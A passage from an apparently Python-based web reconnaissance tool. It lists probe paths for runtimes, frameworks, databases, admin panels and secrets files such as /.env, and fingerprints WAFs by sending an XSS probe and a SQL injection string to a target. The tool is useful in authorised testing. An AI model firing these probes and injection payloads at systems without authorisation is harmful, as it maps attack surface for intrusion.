                        'lua_scripts': True,
                        'stats_interface': True,
                        'spoe_support': True
                    }
                },
                'security_features': {
                    'identity_and_access': {
                        'spiffe_spire': True,
                        'service_accounts': True,
                        'rbac_policies': True,
                        'authorization_policies': True
                    },
                    'encryption': {
                        'mtls_enforcement': True,
                        'cert_management': True,
                        'key_rotation': True,
                        'ca_integration': True
                    },
                    'policy_enforcement': {
                        'network_policies': True,
                        'security_policies': True,
                        'compliance_checks': True,
                        'audit_logging': True
                    }
                },
                'traffic_management': {
                    'routing': {
                        'virtual_services': True,
                        'destination_rules': True,
                        'gateways': True,
                        'service_entries': True
                    },
                    'load_balancing': {
                        'algorithms': ['round_robin', 'least_conn', 'random', 'passthrough'],
                        'consistent_hash': True,
                        'locality_aware': True,
                        'outlier_detection': True
                    },
                    'resilience': {
                        'circuit_breakers': True,
                        'timeouts': True,
                        'retries': True,
                        'bulkhead_isolation': True
                    },
                    'canary_deployments': {
                        'traffic_shifting': True,
                        'header_based_routing': True,
                        'weight_based_routing': True,
                        'mirror_traffic': True
                    }
                },
                'observability_stack': {
                    'distributed_tracing': {
                        'trace_sampling': True,
                        'baggage_propagation': True,
                        'span_tags': True,
                        'trace_correlation': True
                    },
                    'metrics_collection': {
                        'service_metrics': True,
                        'proxy_metrics': True,
                        'control_plane_metrics': True,
                        'custom_metrics': True
                    },
                    'access_logging': {
                        'structured_logs': True,
                        'sampling_rates': True,
                        'custom_formats': True,
                        'log_shipping': True
                    },
                    'alerting': {
                        'sli_slo_monitoring': True,
                        'error_rate_alerts': True,
                        'latency_alerts': True,
                        'availability_alerts': True
                    }
                },
                'deployment_patterns': {
                    'sidecar_injection': {
                        'automatic_injection': True,
                        'manual_injection': True,
                        'annotation_based': True,
                        'namespace_based': True
                    },
                    'ingress_gateway': {
                        'external_traffic': True,
                        'tls_termination': True,
                        'certificate_management': True,
                        'rate_limiting': True
                    },
                    'egress_gateway': {
                        'external_services': True,
                        'service_entries': True,
                        'tls_origination': True,
                        'access_control': True
                    },
                    'multi_cluster': {
                        'cross_cluster_discovery': True,
                        'cross_cluster_communication': True,
                        'cluster_federation': True,
                        'failover': True
                    }
                },
                'integration_detection': {
                    'kubernetes': {
                        'crd_support': True,
                        'operator_pattern': True,
                        'webhook_admission': True,
                        'service_discovery': True
                    },
                    'service_discovery': {
                        'consul': True,
                        'eureka': True,
                        'etcd': True,
                        'dns_based': True
                    },
                    'certificate_management': {
                        'cert_manager': True,
                        'vault_integration': True,
                        'external_ca': True,
                        'self_signed': True
                    },
                    'monitoring_integration': {
                        'prometheus': True,
                        'grafana': True,
                        'jaeger': True,
                        'kiali': True,
                        'datadog': True,
                        'new_relic': True
                    }
                },
                'performance_analysis': {
                    'latency_percentiles': ['p50', 'p90', 'p95', 'p99', 'p99.9'],
                    'throughput_metrics': True,
                    'error_rate_tracking': True,
                    'resource_utilization': True,
                    'proxy_overhead': True,
                    'control_plane_performance': True
                },
                'compliance_and_governance': {
                    'policy_as_code': True,
                    'configuration_drift': True,
                    'security_scanning': True,
                    'compliance_reporting': True,
                    'audit_trails': True,
                    'change_management': True
                }
            },

            # Layer 7: Container Orchestration Detection
            'container_detection': {
                'priority': 7,
                'headers': {
                    'X-Container-Test': markers['uuid'],
                    'X-K8s-Test': markers['sequence'],
                    'X-Docker-Test': markers['uuid']
                },
                'container_tests': {
                    'kubernetes': {
                        'service_discovery': [
                            'service.namespace.svc.cluster.local',
                            'internal.service.discovery'
                        ],
                        'endpoints': [
                            f'/metrics?test={markers["uuid"]}',
                            f'/healthz?test={markers["uuid"]}',
                            f'/readyz?test={markers["uuid"]}',
                            f'/livez?test={markers["uuid"]}'
                        ],
                        'dns_patterns': ['.svc.cluster.local', '.internal']
                    },
                    'docker_swarm': {
                        'service_discovery': ['tasks.service-name'],
                        'overlay_networks': True
                    },
                    'ecs_fargate': {
                        'task_metadata': [
                            f'/v2/metadata?test={markers["uuid"]}',
                            f'/v2/stats?test={markers["uuid"]}'
                        ],
                        'aws_specific': True
                    }
                },
                'container_signatures': {
                    'kubernetes': ['x-kubernetes', 'x-k8s', 'x-pod-name'],
                    'docker': ['x-docker', 'x-container-id'],
                    'ecs': ['x-ecs-task', 'x-amzn-trace-id'],
                    'openshift': ['x-openshift']
                }
            },

            # Layer 8: Application Runtime Detection (Enhanced)
            'runtime_detection': {
                'priority': 8,
                'headers': {
                    'X-Runtime-Test': markers['uuid'],
                    'X-Framework-Test': markers['sequence'],
                    'X-Language-Test': markers['timestamp'],
                    'X-Version-Test': markers['uuid']
                },
                'runtime_tests': {
                    'language_detection': {
                        'java': [
                            f'/actuator/health?test={markers["uuid"]}',
                            f'/jolokia?test={markers["uuid"]}',
                            f'/hawtio?test={markers["uuid"]}',
                            f'/micrometer?test={markers["uuid"]}',
                            f'/management/metrics?test={markers["uuid"]}',
                            f'/jmx-console?test={markers["uuid"]}'
                        ],
                        'nodejs': [
                            f'/debug?test={markers["uuid"]}',
                            f'/status?test={markers["uuid"]}',
                            f'/healthcheck?test={markers["uuid"]}',
                            f'/.well-known/health?test={markers["uuid"]}',
                            f'/metrics?test={markers["uuid"]}'
                        ],
                        'python': [
                            f'/debug?test={markers["uuid"]}',
                            f'/__debug__?test={markers["uuid"]}',
                            f'/health?test={markers["uuid"]}',
                            f'/metrics?test={markers["uuid"]}',
                            f'/status?test={markers["uuid"]}'
                        ],
                        'dotnet': [
                            f'/health?test={markers["uuid"]}',
                            f'/info?test={markers["uuid"]}',
                            f'/metrics?test={markers["uuid"]}',
                            f'/swagger?test={markers["uuid"]}',
                            f'/weatherforecast?test={markers["uuid"]}'  # Default ASP.NET template
                        ],
                        'php': [
                            f'/phpinfo.php?test={markers["uuid"]}',
                            f'/info.php?test={markers["uuid"]}',
                            f'/status.php?test={markers["uuid"]}',
                            f'/health.php?test={markers["uuid"]}',
                            f'/server-status?test={markers["uuid"]}'
                        ],
                        'go': [
                            f'/debug/pprof?test={markers["uuid"]}',
                            f'/health?test={markers["uuid"]}',
                            f'/metrics?test={markers["uuid"]}',
                            f'/debug/vars?test={markers["uuid"]}',
                            f'/healthz?test={markers["uuid"]}'
                        ],
                        'rust': [
                            f'/health?test={markers["uuid"]}',
                            f'/metrics?test={markers["uuid"]}',
                            f'/debug?test={markers["uuid"]}',
                            f'/status?test={markers["uuid"]}'
                        ],
                        'ruby': [
                            f'/health?test={markers["uuid"]}',
                            f'/status?test={markers["uuid"]}',
                            f'/debug?test={markers["uuid"]}',
                            f'/rails/info/routes?test={markers["uuid"]}'
                        ],
                        'scala': [
                            f'/actuator/health?test={markers["uuid"]}',
                            f'/healthcheck?test={markers["uuid"]}',
                            f'/metrics?test={markers["uuid"]}',
                            f'/management/health?test={markers["uuid"]}'
                        ],
                        'kotlin': [
                            f'/actuator/health?test={markers["uuid"]}',
                            f'/health?test={markers["uuid"]}',
                            f'/metrics?test={markers["uuid"]}'
                        ]
                    },
                    'framework_detection': {
                        # Java Frameworks
                        'spring_boot': [
                            '/actuator/', '/management/', '/beans', '/configprops',
                            '/actuator/env', '/actuator/metrics', '/actuator/loggers'
                        ],
                        'quarkus': [
                            '/q/health/', '/q/metrics/', '/q/openapi/',
                            '/q/health/live', '/q/health/ready', '/q/dev/'
                        ],
                        'micronaut': [
                            '/health/', '/beans/', '/routes/', '/info/',
                            '/metrics/', '/loggers/'
                        ],
                        'vertx': [
                            '/eventbus/', '/health/', '/metrics/',
                            '/sockjs/', '/vertx/'
                        ],
                        'dropwizard': [
                            '/healthcheck', '/metrics', '/ping',
                            '/threads', '/tasks'
                        ],
                        
                        # JavaScript/Node.js Frameworks
                        'express_js': [
                            '/api/', '/debug/', '/status/',
                            '/health/', '/metrics/'
                        ],
                        'nestjs': [
                            '/health/', '/swagger/', '/metrics/',
                            '/docs/', '/api/', '/graphql'
                        ],
                        'koa': ['/health/', '/status/', '/api/'],
                        'fastify': [
                            '/health/', '/metrics/', '/documentation/',
                            '/swagger/', '/api/'
                        ],
                        'next_js': [
                            '/_next/', '/api/', '/__next/',
                            '/api/health', '/_next/static/'
                        ],
                        'nuxt': [
                            '/_nuxt/', '/api/', '/.nuxt/',
                            '/api/health'
                        ],
                        'meteor': [
                            '/sockjs/', '/__meteor__/', '/api/',
                            '/health/'
                        ],
                        
                        # Python Frameworks
                        'django': [
                            '/__debug__/', '/admin/', '/api/',
                            '/debug/', '/health/', '/static/admin/'
                        ],
                        'flask': [
                            '/debug/', '/status/', '/health/',
                            '/api/', '/metrics/'
                        ],
                        'fastapi': [
                            '/docs/', '/openapi.json', '/health/',
                            '/redoc/', '/api/', '/metrics/'
                        ],
                        'tornado': ['/health/', '/status/', '/api/'],
                        'pyramid': ['/debug/', '/health/', '/api/'],
                        'bottle': ['/debug/', '/status/', '/api/'],
                        'cherrypy': ['/status/', '/health/', '/api/'],
                        
                        # .NET Frameworks
                        'aspnet_core': [
                            '/health/', '/swagger/', '/api/',
                            '/weatherforecast', '/hubs/', '/metrics/'
                        ],
                        'aspnet_mvc': [
                            '/health/', '/api/', '/trace.axd',
                            '/elmah.axd'
                        ],
                        'blazor': [
                            '/_blazor/', '/api/', '/health/',
                            '/_framework/'
                        ],
                        
                        # PHP Frameworks
                        'laravel': [
                            '/telescope/', '/horizon/', '/health/',
                            '/api/', '/docs/', '/nova/'
                        ],
                        'symfony': [
                            '/debug/', '/_wdt/', '/_profiler/',
                            '/api/', '/health/', '/_error/'
                        ],
                        'codeigniter': [
                            '/debug/', '/system/', '/api/',
                            '/index.php/welcome/'
                        ],
                        'zend': ['/debug/', '/status/', '/api/'],
                        'cakephp': [
                            '/debug/', '/api/', '/health/',
                            '/debug_kit/'
                        ],
                        
                        # Go Frameworks
                        'gin': [
                            '/debug/pprof/', '/health/', '/metrics/',
                            '/api/', '/ping'
                        ],
                        'echo': ['/health/', '/metrics/', '/api/'],
                        'fiber': ['/health/', '/metrics/', '/api/'],
                        'beego': [
                            '/healthcheck/', '/task/', '/api/',
                            '/swagger/'
                        ],
                        'buffalo': ['/health/', '/api/', '/debug/'],
                        
                        # Ruby Frameworks
                        'rails': [
                            '/rails/info/', '/health/', '/debug/',
                            '/api/', '/cable/', '/rails/mailers/'
                        ],
                        'sinatra': ['/health/', '/status/', '/api/'],
                        'grape': ['/api/', '/swagger/', '/health/'],
                        
                        # Rust Frameworks
                        'actix_web': ['/health/', '/metrics/', '/api/'],
                        'warp': ['/health/', '/metrics/', '/api/'],
                        'rocket': ['/health/', '/metrics/', '/api/'],
                        'axum': ['/health/', '/metrics/', '/api/'],
                        
                        # Scala Frameworks
                        'play': [
                            '/health/', '/metrics/', '/api/',
                            '/assets/', '/docs/'
                        ],
                        'akka_http': [
                            '/health/', '/metrics/', '/api/',
                            '/system/'
                        ]
                    },
                    'runtime_version_detection': {
                        'version_endpoints': [
                            '/version', '/v1/version', '/api/version',
                            '/build-info', '/info', '/about',
                            '/actuator/info', '/management/info',
                            '/api/v1/version', '/.well-known/version'
                        ],
                        'build_info_endpoints': [
                            '/build', '/build-info', '/actuator/info',
                            '/api/build', '/version.json', '/manifest.json'
                        ]
                    },
                    'runtime_specific_paths': {
                        'java_specific': [
                            '/WEB-INF/', '/META-INF/', '/classes/',
                            '/lib/', '/resources/', '/static/'
                        ],
                        'nodejs_specific': [
                            '/node_modules/', '/public/', '/dist/',
                            '/build/', '/assets/'
                        ],
                        'python_specific': [
                            '/__pycache__/', '/static/', '/media/',
                            '/templates/', '/locale/'
                        ],
                        'php_specific': [
                            '/vendor/', '/public/', '/storage/',
                            '/bootstrap/', '/config/'
                        ],
                        'dotnet_specific': [
                            '/bin/', '/obj/', '/wwwroot/',
                            '/Views/', '/Controllers/'
                        ]
                    },
                    'error_page_fingerprinting': {
                        'test_paths': [
                            '/nonexistent-page-404',
                            '/error-test-500',
                            '/forbidden-403',
                            '/method-not-allowed-405'
                        ],
                        'framework_error_signatures': {
                            'spring_boot': ['Whitelabel Error Page', 'Spring Boot', 'org.springframework'],
                            'django': ['DisallowedHost', 'Django', 'django.core'],
                            'flask': ['werkzeug', 'Flask', 'Werkzeug Debugger'],
                            'express': ['Cannot GET', 'Express', 'express'],
                            'laravel': ['Illuminate\\', 'Laravel', 'Whoops'],
                            'asp_net': ['ASP.NET', 'System.Web', 'Server Error'],
                            'rails': ['ActionController', 'Rails', 'We\'re sorry'],
                            'fastapi': ['FastAPI', 'detail', 'Swagger UI'],
                            'gin': ['404 page not found', 'gin-gonic'],
                            'actix': ['actix-web', 'Not Found']
                        }
                    }
                },
                'runtime_signatures': {
                    'java': [
                        'java', 'jvm', 'spring', 'tomcat', 'jetty', 'undertow',
                        'quarkus', 'micronaut', 'vertx', 'dropwizard'
                    ],
                    'nodejs': [
                        'node', 'express', 'v8', 'npm', 'yarn', 'nestjs',
                        'next', 'nuxt', 'meteor', 'socket.io'
                    ],
                    'python': [
                        'python', 'django', 'flask', 'wsgi', 'fastapi',
                        'gunicorn', 'uvicorn', 'tornado', 'pyramid', 'bottle'
                    ],
                    'dotnet': [
                        'asp.net', 'iis', '.net', 'kestrel', 'blazor',
                        'signalr', 'entity-framework'
                    ],
                    'php': [
                        'php', 'apache', 'nginx-php', 'laravel', 'symfony',
                        'codeigniter', 'zend', 'cakephp'
                    ],
                    'go': [
                        'go', 'golang', 'gin', 'echo', 'fiber',
                        'beego', 'buffalo', 'gorilla'
                    ],
                    'rust': [
                        'rust', 'cargo', 'actix', 'warp', 'rocket',
                        'axum', 'hyper'
                    ],
                    'ruby': [
                        'ruby', 'rails', 'sinatra', 'puma', 'unicorn',
                        'grape', 'roda'
                    ],
                    'scala': [
                        'scala', 'akka', 'play', 'sbt', 'finatra',
                        'http4s'
                    ],
                    'kotlin': [
                        'kotlin', 'ktor', 'spring-kotlin', 'exposed'
                    ],
                    'clojure': [
                        'clojure', 'ring', 'compojure', 'leiningen',
                        'pedestal'
                    ]
                },
                'response_analysis': {
                    'header_patterns': [
                        'Server', 'X-Powered-By', 'X-AspNet-Version',
                        'X-Runtime', 'X-Version', 'X-Framework',
                        'X-Generator', 'X-Drupal-Cache', 'X-Pingback'
                    ],
                    'content_analysis': {
                        'meta_tags': ['generator', 'framework', 'powered-by'],
                        'script_sources': ['jquery', 'bootstrap', 'react', 'vue', 'angular'],
                        'css_frameworks': ['bootstrap', 'tailwind', 'bulma', 'material-ui']
                    },
                    'timing_analysis': {
                        'cold_start_detection': True,
                        'response_time_profiling': True,
                        'jit_compilation_detection': True
                    }
                }
            },

            # Layer 9: Database/Storage Detection (Enhanced)
            'database_detection': {
                'priority': 9,
                'headers': {
                    'X-Database-Test': markers['uuid'],
                    'X-Storage-Test': markers['sequence'],
                    'X-Cache-Test': markers['timestamp'],
                    'X-Analytics-Test': markers['uuid']
                },
                'db_tests': {
                    'relational_databases': {
                        'postgresql': [
                            f'/pg_stat_activity?test={markers["uuid"]}',
                            f'/pg_stat_database?test={markers["uuid"]}',
                            f'/pg_isready?test={markers["uuid"]}',
                            f'/postgres/health?test={markers["uuid"]}'
                        ],
                        'mysql': [
                            f'/mysql/status?test={markers["uuid"]}',
                            f'/mysql/variables?test={markers["uuid"]}',
                            f'/mysql/health?test={markers["uuid"]}',
                            f'/phpmyadmin?test={markers["uuid"]}'
                        ],
                        'mariadb': [
                            f'/mariadb/status?test={markers["uuid"]}',
                            f'/mariadb/health?test={markers["uuid"]}'
                        ],
                        'oracle': [
                            f'/oracle/health?test={markers["uuid"]}',
                            f'/em/console?test={markers["uuid"]}',
                            f'/apex?test={markers["uuid"]}'
                        ],
                        'mssql': [
                            f'/mssql/health?test={markers["uuid"]}',
                            f'/sql/health?test={markers["uuid"]}'
                        ],
                        'sqlite': [
                            f'/sqlite/health?test={markers["uuid"]}',
                            f'/db.sqlite3?test={markers["uuid"]}'
                        ]
                    },
                    'nosql_databases': {
                        'mongodb': [
                            f'/mongo/status?test={markers["uuid"]}',
                            f'/mongo/health?test={markers["uuid"]}',
                            f'/admin/buildinfo?test={markers["uuid"]}',
                            f'/mongoexpress?test={markers["uuid"]}'
                        ],
                        'cassandra': [
                            f'/cassandra/health?test={markers["uuid"]}',
                            f'/cassandra/status?test={markers["uuid"]}',
                            f'/jolokia/read/org.apache.cassandra.metrics?test={markers["uuid"]}'
                        ],
                        'couchdb': [
                            f'/couchdb/_up?test={markers["uuid"]}',
                            f'/couchdb/_utils?test={markers["uuid"]}',
                            f'/_up?test={markers["uuid"]}'
                        ],
                        'dynamodb': [
                            f'/dynamodb/health?test={markers["uuid"]}',
                            f'/dynamodb-local?test={markers["uuid"]}'
                        ],
                        'neo4j': [
                            f'/db/data?test={markers["uuid"]}',
                            f'/browser?test={markers["uuid"]}',
                            f'/neo4j/health?test={markers["uuid"]}'
                        ]
                    },
                    'database_proxies': [
                        f'/db-status?test={markers["uuid"]}',
                        f'/pgbouncer?test={markers["uuid"]}',
                        f'/pgpool?test={markers["uuid"]}',
                        f'/mysql-proxy?test={markers["uuid"]}',
                        f'/proxysql?test={markers["uuid"]}',
                        f'/haproxy/stats?test={markers["uuid"]}',
                        f'/pgcat?test={markers["uuid"]}'
                    ],
                    'cache_layers': {
                        'redis': [
                            f'/redis/info?test={markers["uuid"]}',
                            f'/redis/ping?test={markers["uuid"]}',
                            f'/redis/health?test={markers["uuid"]}',
                            f'/redis-commander?test={markers["uuid"]}',
                            f'/redisinsight?test={markers["uuid"]}'
                        ],
                        'memcached': [
                            f'/memcached/stats?test={markers["uuid"]}',
                            f'/memcached/health?test={markers["uuid"]}'
                        ],
                        'hazelcast': [
                            f'/hazelcast/health?test={markers["uuid"]}',
                            f'/hazelcast/cluster?test={markers["uuid"]}'
                        ],
                        'ehcache': [
                            f'/ehcache/statistics?test={markers["uuid"]}',
                            f'/ehcache/health?test={markers["uuid"]}'
                        ]
                    },
                    'search_engines': {
                        'elasticsearch': [
                            f'/_cluster/health?test={markers["uuid"]}',
                            f'/_cat/health?test={markers["uuid"]}',
                            f'/_cat/nodes?test={markers["uuid"]}',
                            f'/elasticsearch/health?test={markers["uuid"]}',
                            f'/_plugin/head?test={markers["uuid"]}'
                        ],
                        'opensearch': [
                            f'/_cluster/health?test={markers["uuid"]}',
                            f'/_cat/health?test={markers["uuid"]}',
                            f'/_dashboards?test={markers["uuid"]}'
                        ],
                        'solr': [
                            f'/solr/admin/cores?test={markers["uuid"]}',
                            f'/solr/admin/info/system?test={markers["uuid"]}',
                            f'/solr/#/?test={markers["uuid"]}'
                        ],
                        'sphinx': [
                            f'/sphinx/status?test={markers["uuid"]}',
                            f'/sphinx/health?test={markers["uuid"]}'
                        ]
                    },
                    'message_queues': {
                        'rabbitmq': [
                            f'/rabbitmq/api/overview?test={markers["uuid"]}',
                            f'/rabbitmq/#/?test={markers["uuid"]}',
                            f'/api/overview?test={markers["uuid"]}'
                        ],
                        'kafka': [
                            f'/kafka/health?test={markers["uuid"]}',
                            f'/kafka/topics?test={markers["uuid"]}',
                            f'/kafka-ui?test={markers["uuid"]}'
                        ],
                        'activemq': [
                            f'/admin?test={markers["uuid"]}',
                            f'/activemq/admin?test={markers["uuid"]}'
                        ],
                        'nats': [
                            f'/varz?test={markers["uuid"]}',
                            f'/connz?test={markers["uuid"]}',
                            f'/routez?test={markers["uuid"]}'
                        ],
                        'pulsar': [
                            f'/admin/v2/brokers/health?test={markers["uuid"]}',
                            f'/pulsar-manager?test={markers["uuid"]}'
                        ]
                    },
                    'storage_apis': {
                        's3_compatible': [
                            f'/api/storage?test={markers["uuid"]}',
                            f'/s3-status?test={markers["uuid"]}',
                            f'/minio/health/live?test={markers["uuid"]}',
                            f'/minio/health/ready?test={markers["uuid"]}',
                            f'/.well-known/s3?test={markers["uuid"]}'
                        ],
                        'azure_storage': [
                            f'/blob-storage?test={markers["uuid"]}',
                            f'/azure/storage/health?test={markers["uuid"]}'
                        ],
                        'gcs': [
                            f'/gcs/health?test={markers["uuid"]}',
                            f'/storage/v1?test={markers["uuid"]}'
                        ],
                        'hdfs': [
                            f'/webhdfs/v1?test={markers["uuid"]}',
                            f'/dfshealth.html?test={markers["uuid"]}'
                        ]
                    },
                    'analytics_databases': {
                        'clickhouse': [
                            f'/ping?test={markers["uuid"]}',
                            f'/?query=SELECT%201?test={markers["uuid"]}',
                            f'/play?test={markers["uuid"]}'
                        ],
                        'influxdb': [
                            f'/ping?test={markers["uuid"]}',
                            f'/health?test={markers["uuid"]}',
                            f'/query?test={markers["uuid"]}'
                        ],
                        'prometheus': [
                            f'/-/healthy?test={markers["uuid"]}',
                            f'/-/ready?test={markers["uuid"]}',
                            f'/api/v1/status/config?test={markers["uuid"]}'
                        ],
                        'grafana': [
                            f'/api/health?test={markers["uuid"]}',
                            f'/login?test={markers["uuid"]}',
                            f'/public/build?test={markers["uuid"]}'
                        ]
                    },
                    'time_series_databases': {
                        'influxdb': [
                            f'/ping?test={markers["uuid"]}',
                            f'/health?test={markers["uuid"]}'
                        ],
                        'timescaledb': [
                            f'/timescale/health?test={markers["uuid"]}'
                        ],
                        'victoriametrics': [
                            f'/health?test={markers["uuid"]}',
                            f'/-/healthy?test={markers["uuid"]}'
                        ]
                    },
                    'admin_interfaces': {
                        'phpmyadmin': [
                            f'/phpmyadmin?test={markers["uuid"]}',
                            f'/pma?test={markers["uuid"]}',
                            f'/phpMyAdmin?test={markers["uuid"]}'
                        ],
                        'adminer': [
                            f'/adminer.php?test={markers["uuid"]}',
                            f'/adminer?test={markers["uuid"]}'
                        ],
                        'pgadmin': [
                            f'/pgadmin?test={markers["uuid"]}',
                            f'/pgadmin4?test={markers["uuid"]}'
                        ],
                        'mongo_express': [
                            f'/mongo-express?test={markers["uuid"]}',
                            f'/mongoexpress?test={markers["uuid"]}'
                        ]
                    }
                },
                'db_signatures': {
                    'postgresql': ['postgresql', 'postgres', 'pgbouncer', 'pgpool', 'pg_', 'psql'],
                    'mysql': ['mysql', 'mariadb', 'percona', 'mysql-connector'],
                    'oracle': ['oracle', 'ora_', 'sqlplus', 'tnsnames'],
                    'mssql': ['sqlserver', 'mssql', 'sql-server', 'microsoft-sql'],
                    'sqlite': ['sqlite', 'sqlite3'],
                    
                    'mongodb': ['mongodb', 'mongo', 'bson', 'mongoose'],
                    'cassandra': ['cassandra', 'datastax', 'cql'],
                    'couchdb': ['couchdb', 'couch', '_design'],
                    'dynamodb': ['dynamodb', 'dynamo', 'aws-dynamodb'],
                    'neo4j': ['neo4j', 'cypher', 'graph-db'],
                    
                    'redis': ['redis', 'x-redis', 'redis-cli', 'redis-server'],
                    'memcached': ['memcached', 'x-memcached', 'memcache'],
                    'hazelcast': ['hazelcast', 'hz', 'imap'],
                    'ehcache': ['ehcache', 'terracotta'],
                    
                    'elasticsearch': ['elasticsearch', 'elastic', 'lucene', 'kibana'],
                    'opensearch': ['opensearch', 'opensearch-dashboards'],
                    'solr': ['solr', 'lucene', 'solrcloud'],
                    'sphinx': ['sphinx', 'sphinxsearch'],
                    
                    'rabbitmq': ['rabbitmq', 'amqp', 'erlang'],
                    'kafka': ['kafka', 'zookeeper', 'confluent'],
                    'activemq': ['activemq', 'artemis', 'jms'],
                    'nats': ['nats', 'nats-streaming'],
                    'pulsar': ['pulsar', 'bookkeeper'],
                    
                    's3_compatible': ['s3', 'minio', 'ceph', 'aws-s3'],
                    'azure_storage': ['azure-storage', 'blob-storage'],
                    'gcs': ['google-cloud-storage', 'gcs'],
                    'hdfs': ['hdfs', 'hadoop'],
                    
                    'clickhouse': ['clickhouse', 'ch'],
                    'influxdb': ['influxdb', 'influx', 'flux'],
                    'prometheus': ['prometheus', 'prom'],
                    'grafana': ['grafana'],
                    'victoriametrics': ['victoriametrics', 'vm']
                },
                'connection_pool_detection': {
                    'java_pools': [
                        'hikaricp', 'c3p0', 'dbcp', 'tomcat-jdbc',
                        'connection-pool', 'datasource'
                    ],
                    'nodejs_pools': [
                        'pg-pool', 'mysql-pool', 'connection-pool',
                        'knex', 'sequelize', 'typeorm'
                    ],
                    'python_pools': [
                        'psycopg2-pool', 'sqlalchemy-pool', 'pymongo-pool',
                        'connection-pool'
                    ],
                    'dotnet_pools': [
                        'connection-string', 'entity-framework', 'ado.net',
                        'npgsql', 'mysql-connector'
                    ]
                },
                'database_monitoring': {
                    'health_endpoints': [
                        '/db/health', '/database/status', '/db/ping',
                        '/health/db', '/ready/db', '/live/db'
                    ],
                    'metrics_endpoints': [
                        '/db/metrics', '/database/metrics', '/db/stats',
                        '/metrics/database', '/prometheus/db'
                    ],
                    'performance_endpoints': [
                        '/db/performance', '/database/slow-queries',
                        '/db/explain', '/database/locks'
                    ]
                },
                'orm_detection': {
                    'java_orms': ['hibernate', 'jpa', 'mybatis', 'jooq'],
                    'nodejs_orms': ['sequelize', 'typeorm', 'prisma', 'knex'],
                    'python_orms': ['django-orm', 'sqlalchemy', 'peewee', 'tortoise'],
                    'dotnet_orms': ['entity-framework', 'dapper', 'nhibernate'],
                    'php_orms': ['eloquent', 'doctrine', 'propel'],
                    'ruby_orms': ['active-record', 'sequel', 'datamapper']
                }
            },

            # Layer 10: Serverless/Function Detection
            'serverless_detection': {
                'priority': 10,
                'headers': {
                    'X-Serverless-Test': markers['uuid'],
                    'X-Function-Test': markers['sequence']
                },
                'serverless_tests': {
                    'cold_start_analysis': {
                        'timing_tests': True,
                        'initialization_detection': True
                    },
                    'execution_context': {
                        'memory_limits': True,
                        'timeout_detection': True,
                        'concurrent_execution': True
                    },
                    'event_sources': [
                        'api_gateway', 'sqs', 's3', 'dynamodb', 'eventbridge'
                    ]
                },
                'serverless_signatures': {
                    'aws_lambda': ['x-amzn-requestid', 'lambda'],
                    'azure_functions': ['x-ms-invocation-id'],
                    'google_functions': ['function-execution-id'],
                    'vercel': ['x-vercel-'],
                    'netlify': ['x-nf-']
                }
            },

            # Layer 11: Backend Detection
            'backend_detection': {
                'priority': 11,
                'paths': [
                    f'/server-info?test={markers["uuid"]}',
                    f'/server-status?test={markers["uuid"]}',
                    f'/.env?test={markers["uuid"]}',
                    f'/phpinfo.php?test={markers["uuid"]}'
                ]
            },
            # Sistema di analisi dinamica per layer aggiuntivi
            'dynamic_layer_detection': {
                'priority': 99,
                'adaptive_testing': True,
                'layer_chaining_analysis': True,
                'response_correlation': True,
                'timing_fingerprinting': True,
                'behavioral_analysis': True,
                'unknown_component_detection': {
                    'header_pattern_analysis': True,
                    'response_pattern_analysis': True,
                    'timing_pattern_analysis': True,
                    'error_pattern_analysis': True
                }
            }
        }

    def waf_fingerprinting_extended(self, waf_payloads):
        """Advanced WAF fingerprinting - EXTENDED VERSION"""
        print("  🛡️  WAF Detection...")

        # Your original signatures + EXTENSIONS
        waf_signatures = {
            'cloudflare': ['cf-ray', 'cloudflare', 'error 1020'],
            'aws-waf': ['awselb', 'aws', 'x-amzn'],
            'imperva': ['incap_ses', 'visid_incap', 'imperva'],
            'akamai': ['akamai', 'ak-bmsc'],
            'wordfence': ['wordfence', 'this site is protected'],
            'sucuri': ['sucuri', 'access denied.*sucuri'],
            'barracuda': ['barracuda', 'bnsv'],
            'f5': ['f5', 'bigip', 'x-wa-info'],
            'fortinet': ['fortigate', 'fortiweb'],
            'ispconfig': ['ispconfig', 'blocked by security policy', 'request rejected', 'web application firewall'],
            # EXTENDED WAF SIGNATURES
            'modsecurity': ['mod_security', 'modsec', 'not acceptable'],
            'naxsi': ['naxsi', 'unusual url'],
            'wallarm': ['wallarm', 'blocked by wallarm'],
            'azure-waf': ['applicationgateway', 'x-azure-ref'],
            'citrix': ['citrix', 'netscaler', 'ns_af'],
            'radware': ['radware', 'x-rdwr-'],
            'kemp': ['kemp', 'x-kemp-'],
            'checkpoint': ['checkpoint', 'fw-1'],
            'paloalto': ['paloalto', 'pan-'],
            'sophos': ['sophos', 'utm'],
            'webknight': ['webknight', 'blocked by webknight']
        }

        detected_waf = None

        # Your original test logic (PRESERVED)
        for payload in waf_payloads['payloads']:
            try:
                response = self.session.get(
                    f"{self.target_url}{payload}",
                    headers=waf_payloads['headers'],
                    timeout=10
                )

                full_response = f"{response.status_code} {response.headers} {response.text}".lower()

                for waf, signatures in waf_signatures.items():
                    for signature in signatures:
                        if re.search(signature, full_response):
                            detected_waf = waf
                            break
                    if detected_waf:
                        break

                if detected_waf:
                    break

            except Exception as e:
                continue

        # Your original ISPConfig test (PRESERVED)
        if not detected_waf:
            try:
                markers = self.generate_unique_markers()
                path_injection_payload = f"/test{markers['uuid']}%3cscript%3ealert(1)%3c/script%3e/"

                response = self.session.get(
                    f"{self.target_url}{path_injection_payload}",
                    headers=waf_payloads['headers'],
                    timeout=10
                )

                full_response = f"{response.status_code} {response.headers} {response.text}".lower()

                if response.status_code == 403:
                    for signature in waf_signatures['ispconfig']:
                        if re.search(signature, full_response):
                            detected_waf = 'ispconfig'
                            break

            except Exception as e:
                pass

        # EXTENDED: Additional WAF detection techniques
        if not detected_waf:
            try:
                # SQL injection test for WAF detection
                sql_payload = "?id=1' OR '1'='1"
                response = self.session.get(f"{self.target_url}{sql_payload}", timeout=5)
                if response.status_code in [403, 406, 501, 503]:
                    full_response = f"{response.headers} {response.text}".lower()
                    for waf, signatures in waf_signatures.items():
                        for signature in signatures:
                            if re.search(signature, full_response):
                                detected_waf = waf
                                break
                        if detected_waf:
                            break
            except Exception:
                pass

        if detected_waf:
            self.log_discovery("WAF", "Detection", detected_waf)
            self.chain_map['layers'].append(f"WAF-{detected_waf}")
        else:
            self.log_discovery("WAF", "Detection", "None detected or unknown")

    def proxy_fingerprinting_extended(self, proxy_headers):
        """Detect proxy/load balancer configuration - EXTENDED VERSION"""
        print("  🔄 Proxy Detection...")

        try:
            response = self.session.get(self.target_url, headers=proxy_headers['headers'])

            # Your original indicators + EXTENSIONS
            proxy_indicators = {
                'nginx': ['server.*nginx', 'x-nginx'],
